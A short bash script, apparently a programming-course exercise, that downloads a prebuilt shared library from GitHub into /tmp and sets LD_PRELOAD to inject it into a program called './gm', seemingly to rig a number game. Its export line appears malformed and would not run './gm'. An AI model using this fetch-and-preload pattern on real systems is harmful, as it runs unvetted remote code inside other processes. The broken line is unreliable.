#!/bin/bash
wget -P /tmp https://github.com/dakhamohammed/alx-low_level_programming/raw/main/0x18-dynamic_libraries/inject.so
export LD_PRELOAD=/tmp/inject.so ./gm 9 8 10 24 75 9
